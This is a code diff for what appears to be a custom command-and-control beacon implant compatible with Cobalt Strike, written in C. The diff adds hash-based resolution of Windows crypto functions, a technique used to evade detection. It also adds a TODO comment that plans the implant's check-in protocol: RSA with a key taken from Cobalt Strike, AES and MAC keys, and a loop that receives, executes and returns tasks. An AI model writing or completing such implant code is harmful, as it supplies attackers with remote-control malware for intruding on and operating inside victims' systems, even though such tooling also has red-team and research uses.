@@ -22,9 +22,9 @@
  * passed in as a parameter.
  *
 -*/
-DEFINESEC(B) VOID BeaconStart( PVOID Config )
+DEFINESEC(B) VOID BeaconStart( PUCHAR RsaKey )
 {
-	BEACON_INSTANCE Ins;
+	BEACON_INSTANCE Ins = { 0 };
 	UCHAR           Str[MAX_PATH];
 	PVOID           Img;
 
@@ -72,7 +72,9 @@ DEFINESEC(B) VOID BeaconStart( PVOID Config )
 		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
 		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
 		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
+		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
 		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
+		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
 		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
 		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
 
@@ -107,6 +109,39 @@ DEFINESEC(B) VOID BeaconStart( PVOID Config )
 
 		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );
 
+		/*-
+		 *
+		 * TODO
+		 *
+		 * 1. Initialize RSA with the DER encoded key
+		 * extracted from Cobalt Strike.
+		 *
+		 * 2. Initialize AES with a random key from
+		 * CryptGenRandom().
+		 *
+		 * 3. Initialize MAC with a random key from
+		 * CryptGenRandom().
+		 *
+		 * 4. Create check-in packet containing the
+		 * info about the Beacon.
+		 *
+		 * 5. Send the packet. If it responds with a
+		 * SUCCESS response, start the IO loop with
+		 * a recv/execute-task/send loop. 
+		 * 
+		 * 6. In pointer arrays, create C defs for
+		 * the various index's.
+		 *
+		 * Functions needed:
+		 *
+		 * 	1. CryptAesEnc()
+		 * 	2. CryptAesDec()
+		 * 	3. CryptRsaEnc()
+		 * 	4. CryptMacHash()
+		 *	5. CryptInit()
+		 *
+		-*/
+
 		if ( Ins.Module[3] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[3] );
 
@@ -119,5 +154,8 @@ DEFINESEC(B) VOID BeaconStart( PVOID Config )
 		if ( Ins.Module[0] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[0] );
 	};
+
+	RtlSecureZeroMemory( &Ins, sizeof( Ins ) );
+
 	return;
 };
